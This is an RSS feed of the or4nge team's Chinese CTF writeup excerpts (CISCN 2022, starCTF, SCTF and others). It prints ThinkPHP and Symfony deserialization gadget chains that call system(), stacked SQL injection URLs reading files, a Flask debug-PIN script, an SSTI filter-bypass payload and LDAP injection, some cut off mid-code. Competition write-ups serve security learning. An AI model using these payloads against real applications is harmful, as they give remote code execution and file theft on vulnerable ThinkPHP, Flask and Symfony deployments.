<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Writeup on or4nge</title>
    <link>https://or4ngesec.github.io/tags/writeup/</link>
    <description>Recent content in Writeup on or4nge</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 01 Jun 2022 17:17:17 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/tags/writeup/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CISCN2022 初赛 Writeup by or4nge</title>
      <link>https://or4ngesec.github.io/post/ciscn-2022-writeup-by-or4nge/</link>
      <pubDate>Wed, 01 Jun 2022 17:17:17 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/ciscn-2022-writeup-by-or4nge/</guid>
      <description>Web ezpop tp6.0.12的反序列化洞，直接用现成的链的打就行
&amp;lt;?php namespace think{ abstract class Model{ private $lazySave = false; private $data = []; private $exists = false; protected $table; private $withAttr = []; protected $json = []; protected $jsonAssoc = false; function __construct($obj = &amp;#39;&amp;#39;){ $this-&amp;gt;lazySave = True; $this-&amp;gt;data = [&amp;#39;key&amp;#39; =&amp;gt; [&amp;#34;cat /flag.txt&amp;#34;]]; $this-&amp;gt;exists = True; $this-&amp;gt;table = $obj; $this-&amp;gt;withAttr = [&amp;#39;key&amp;#39; =&amp;gt; [&amp;#39;system&amp;#39;]]; $this-&amp;gt;json = [&amp;#39;key&amp;#39;,[&amp;#39;key&amp;#39;]]; $this-&amp;gt;jsonAssoc = True; } } } namespace think\model{ use think\Model; class Pivot extends Model{ } } namespace{ echo(urlencode(serialize(new think\model\Pivot(new think\model\Pivot())))); } Pwn login-nomal 可见字符shellcode，调用ae64脚本，rdx直接打通</description>
    </item>
    
    <item>
      <title>starCTF2022 Writeup by or4nge</title>
      <link>https://or4ngesec.github.io/post/starctf2022-writeup-by-or4nge/</link>
      <pubDate>Mon, 18 Apr 2022 15:03:17 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/starctf2022-writeup-by-or4nge/</guid>
      <description>Web oh-my-notepro debug 模式为开，随便试一试即可触发报错，note_id 处存在注入，使用 load data local infile &#39;xx&#39; into table xx 可以读文件。
创建临时表：
http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;create table otable(data varchar(10000));--+ 把文件写入表中：
http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;load data local infile &amp;#34;/app/app.py&amp;#34; into table otable;--+ 读取数据：
http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,(select group_concat(data, &amp;#39;\n&amp;#39;) from (select data from otable limit 0,50)x),5;--+ debug模式为开，考虑计算flask debug pin，exp如下：
import hashlib from itertools import chain def get_machine_id(): machine_id = &amp;#39;1cc402dd0e11d5ae18db04a6de87223d&amp;#39; # /etc/machine-id  boot_id = &amp;#39;&amp;#39; # /proc/sys/kernel/random/boot_id  cgroup = &amp;#39;4b13f9ab9776ea7cf70e6ab9b3a06f5987e0d7b73fe5703ecf8e1d06018ebc71&amp;#39; # /proc/1/cgroup  linux = machine_id + boot_id + cgroup return linux rv = None num = None mac = &amp;#39;02:42:ac:1c:00:03&amp;#39;# /sys/class/net/eth0/address  probably_public_bits = [ &amp;#39;ctf&amp;#39;,# username  &amp;#39;flask.</description>
    </item>
    
    <item>
      <title>HGAME2022 Writeup by or4nge</title>
      <link>https://or4ngesec.github.io/post/hgame2022-writeup-by-or4nge/</link>
      <pubDate>Fri, 25 Feb 2022 22:32:31 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/hgame2022-writeup-by-or4nge/</guid>
      <description>week1 [Web]Fujiwara Tofu Shop  By SSGSS
 一个个改请求头就 ok
GET / HTTP/1.1Host: game.summ3r.topUser-Agent: Hachi-RokuAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeGasoline: 100Cookie: flavor=Raspberry;Upgrade-Insecure-Requests: 1Cache-Control: max-age=0Referer: qiumingshan.netX-Real-IP: 127.0.0.1[Web]Tetris plus  By SSGSS
 一个个翻 js，长度最长的那个用 js 运行一下就是 flag
[Web]蛛蛛&amp;hellip;嘿嘿♥我的蛛蛛  By SSGSS
 爬虫题
import requests import re url = &amp;#39;https://hgame-spider.vidar.club/b7412bb0b0&amp;#39; now = &amp;#39;?key=M7H8z1oG%2B1SaPudvsDf7GEm%2F9hyalx2liQ6X2mBSz4iXDqmZwkyLTWPY02GWc5OZf%2F9zO73pRTg3XdoyjfgY3g%3D%3D&amp;#39; while True: r = requests.get(url + now) try: now = re.</description>
    </item>
    
    <item>
      <title>HWS2022冬令营预选赛 Writeup</title>
      <link>https://or4ngesec.github.io/post/hws2022-writeup/</link>
      <pubDate>Wed, 26 Jan 2022 13:03:21 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/hws2022-writeup/</guid>
      <description>RE babyVM 将花指令patch掉


将patch好的应用到文件。

能看出来是个虚拟机逆向题

动态调试的过程中可以看到程序向内存里写了一段数据
0xFF,0x223,0x23B,0x237,0x237,0x24B,0x22B,0xFB,0x22B,0x223,0x24F,0xEF,0x237,0xEF,0x24F,0x24F,0x223,0x223,0x23B,0x237,0xFF,0x233,0x233,0x233,0x237,0x24B,0x233,0x24F,0x22B,0x22B,0x24B,0xEF
这个部分把上述数据每一个都减了0x63
程序获得用户的输入

比较的过程中可以发现，用户输入的长度应该是0x26

并且在后面比较的过程中，flag{}这几个字符占了6个。
再向后跟踪的过程中发现

用户的输入和0x42做了异或

再把结果左移两位，和前面的数据做了比较，因此最后的exp是：
dump = [156, 448, 472, 468, 468, 488, 456, 152, 456, 448, 492, 140, 468, 140, 492, 492, 448, 448, 472, 468, 156, 464, 464, 464, 468, 488, 464, 492, 456, 456, 488, 140] for i in range(len(dump)): print(chr((dump[i]&amp;gt;&amp;gt;2)^0x42),end=&amp;#39;&amp;#39;) print() # e247780d029a7a992247e6667869008a EasyVM</description>
    </item>
    
    <item>
      <title>长安战“疫” Writeup</title>
      <link>https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/</link>
      <pubDate>Thu, 13 Jan 2022 13:23:41 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/</guid>
      <description>Web RCE_No_Para 无参数RCE，且过滤了部分函数。
最终payload：
?a=cat flag.php;&amp;amp;code=system(current(current(get_defined_vars())));flask 查看网页源码
&amp;lt;!--if not request.full_path.endswith(&amp;quot;.js?&amp;quot;):if not request.full_path.startswith(&amp;quot;/login&amp;quot;):return redirect(&amp;quot;login&amp;quot;)--&amp;gt;要求路径是以/login开头，以.js?结尾，
查看 flask 文档
Requested path, including the query string.
所以构造路径：
/login/../admin?a=.js?然后源码提示：
&amp;lt;!--admin/?name=--&amp;gt;使用以下路径发现是ssti
/login/../admin?name={{7*7}}&amp;amp;a=.js?fuzz发现过滤了__，builtins，所以绕，最终payload
/login/../admin?name={{config|attr(&#39;_&#39;+&#39;_init_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_globals_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_getitem_&#39;+&#39;_&#39;)(&#39;_&#39;+&#39;_buil&#39;+&#39;tins_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_getitem_&#39;+&#39;_&#39;)(&#39;eval&#39;)(&#39;_&#39;+&#39;_import_&#39;+&#39;_(&amp;quot;os&amp;quot;).popen(&amp;quot;cat /flag&amp;quot;).read()&#39;)}}&amp;amp;a=.js?tp 变量覆盖+phar反序列化+thinkphp 5.0.24反序列化写webshell
生成phar文件
&amp;lt;?php namespace think\process\pipes; class Windows { private $files = []; public function __construct() { $this-&amp;gt;files = [new \think\model\Merge]; } } namespace think\model; use think\Model; class Merge extends Model { protected $append = []; protected $error; public function __construct() { $this-&amp;gt;append = [ &amp;#39;bb&amp;#39; =&amp;gt; &amp;#39;getError&amp;#39; ]; $this-&amp;gt;error = (new \think\model\relation\BelongsTo); } } namespace think; class Model{} namespace think\console; class Output { protected $styles = []; private $handle = null; public function __construct() { $this-&amp;gt;styles = [&amp;#39;removeWhereField&amp;#39;]; $this-&amp;gt;handle = (new \think\session\driver\Memcache); } } namespace think\model\relation; class BelongsTo { protected $query; public function __construct() { $this-&amp;gt;query = (new \think\console\Output); } } namespace think\session\driver; class Memcache { protected $handler = null; public function __construct() { $this-&amp;gt;handler = (new \think\cache\driver\Memcached); } } namespace think\cache\driver; class File { protected $tag; protected $options = []; public function __construct() { $this-&amp;gt;tag = false; $this-&amp;gt;options = [ &amp;#39;expire&amp;#39; =&amp;gt; 3600, &amp;#39;cache_subdir&amp;#39; =&amp;gt; false, &amp;#39;prefix&amp;#39; =&amp;gt; &amp;#39;&amp;#39;, &amp;#39;data_compress&amp;#39; =&amp;gt; false, &amp;#39;path&amp;#39; =&amp;gt; &amp;#39;php://filter/convert.</description>
    </item>
    
    <item>
      <title>SCTF2021 Writeup by or4nge</title>
      <link>https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/</link>
      <pubDate>Tue, 28 Dec 2021 16:23:17 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/</guid>
      <description>Web loginme 第一步绕过本地验证，x-forwarded-for 和 client-ip 被过滤了，X-Real-IP:127.0.0.1 绕过
第二步是 gin 的模板注入，让 id 为一个不存在的值，age 为 {{.Password}} 就可以获得 admin 结构体中的 Password 变量值了。
http://124.71.166.197:18001/admin/index?id=5&amp;amp;age={{.Password}}
Upload_it 可以任意上传 /tmp 目录下文件， 可以直接写进 session 文件。查看 phpinfo 发现 session 的处理器是 php，于是可以把 upload_path|$serialize 写进 /tmp/sess_or4nge，然后改自己的 session_id 为 or4nge，即可触发反序列化。
利用给的 Composer.json：
&amp;#34;symfony/string&amp;#34;: &amp;#34;^5.3&amp;#34;, &amp;#34;opis/closure&amp;#34;: &amp;#34;^3.6&amp;#34; 结合出题人发布的文章 https://www.anquanke.com/post/id/217929#h2-3 找到一条链，其中 lazystring 的任意无参数函数调用接的是闭包函数 __invoke，可以将闭包函数序列化进去。
&amp;lt;?php namespace Symfony\Component\String{ require &amp;#34;path\to\autoload.php&amp;#34;; class LazyString{ private $value; public function __construct() { $func = function(){system(&amp;#34;cat /flag&amp;#34;);}; $d = new \Opis\Closure\SerializableClosure($func); $this-&amp;gt;value = $d; } } class UnicodeString{ protected $string = &amp;#39;&amp;#39;; public function __construct() { $this-&amp;gt;string=new LazyString; } } } namespace { $exp=print(urlencode(serialize(new Symfony\Component\String\UnicodeString()))); } 其实这条链本地没有打通，原因是因为在 UnicodeString.</description>
    </item>
    
    <item>
      <title>KCTF2021 Fall Writeup by or4nge</title>
      <link>https://or4ngesec.github.io/post/kctf2021-fall-writeup-by-or4nge/</link>
      <pubDate>Thu, 23 Dec 2021 22:23:17 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/kctf2021-fall-writeup-by-or4nge/</guid>
      <description>转载自战队成员博客: https://s0uthwood.github.io/post/two-challenges-in-kctf2021-fall/
第一题 签到 这题还是比较容易的，需要一点点动调的经验
上张队友的截图吧，懒得自己截了

动调看看内存就知道，流程是：
serial-&amp;gt;十进制-&amp;gt;与name的crc异或-&amp;gt;计算crc
最后需要是一个固定的值，于是只需要想办法反解就行了
这里注意到了一个事情，那就是图中看似是对 v6 的 crc 结果做了约束，其实是对 v6 本身进行了约束
由于题目给了一个实例的 name 和 serial，我们只需要动调拿到这个的 v6，就知道能通过验证的 v6 是多少了
接下来动调拿一下 KCTF 的 crc，这个的结果再异或一下目标的 v6，就得到serial了
 靠记忆写的，希望没错
 第二题 迷失丛林  这题就直接放提交的wp了
 很容易定位到程序的输入

输入长度为32，需要通过 sub_4014A0, sub_401580 的验证
4014A0 较为简单，是个经典的hexstr转成char存到 4041F0 这个地址，最后的16是计算转换后的长度，所以输入就是 [0-9A-F]{32}
随后将输入的前八字节存入 404000 中，剩下的部分传参进 sub_401580
要想让该函数返回1，需要先通过如下的if验证

简单看一下使用的变量，应该是对前八字节的输入进行的验证

结合动调发现大概就是根据404000数组，构成一个 &amp;lt;value, index&amp;gt; 的结构，两两存放到404420当中
分析了一下404000数组的作用和特征，发现这个数组应该是构成一个环状的结构（以当前数值作为索引寻找下一个数），猜测不能有重复的数字，否则可能会构成小循环之类的，用脚本验证了一下发现后面248个数字果然没有重复，于是将前八字节的取值可能锁定到了 0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb 中，总共有 $8!</description>
    </item>
    
    <item>
      <title>2021暗泉杯 Writeup</title>
      <link>https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/</link>
      <pubDate>Mon, 06 Dec 2021 19:23:41 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/</guid>
      <description>* 开头题目表示赛后补题
Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
[萌]odd_upload 题目描述：目录结构与官方项目example相同
所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system(&#39;cat /flag&#39;)}，之后再重新访问题目链接就能获取flag。

flag{1ae85554-c785-4321-8d77-0f68974929f8}
easyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登陆后提示
The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_
说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？
按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&#39;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：
Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
import requests url = &amp;#34;http://47.</description>
    </item>
    
    <item>
      <title>2021蓝帽杯决赛 Writeup</title>
      <link>https://or4ngesec.github.io/post/bluehat-final-writeup/</link>
      <pubDate>Fri, 05 Nov 2021 16:23:41 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/bluehat-final-writeup/</guid>
      <description>Misc 溯源取证——张三的电脑 下载得到压缩包，经过判断类型后得知是 VMDK 文件，用 vmware 挂载。其中得到了 zhangsan.001 和 zhangsan.ad1.txt 两个文件
winhex挂载 zhangsan.001，在分区1的 $RECYCLE.BIN 中找到 tips.txt.txt 文件，内容为
In order to prevent leaving evidence, Zhang San deleted all the key evidence photos.因此寻找 png 文件，同样在分区1的 $RECYCLE.BIN 中找到了包含相应的 flag 图片 $REFK9A1.png
Pwn secretcode 掏出初赛的代码稍微改改
from pwn import * import sys # context.log_level = &amp;#34;debug&amp;#34; context.arch = &amp;#39;amd64&amp;#39; if len(sys.argv) &amp;lt; 2: debug = True else: debug = False ru = lambda x : p.</description>
    </item>
    
  </channel>
</rss>
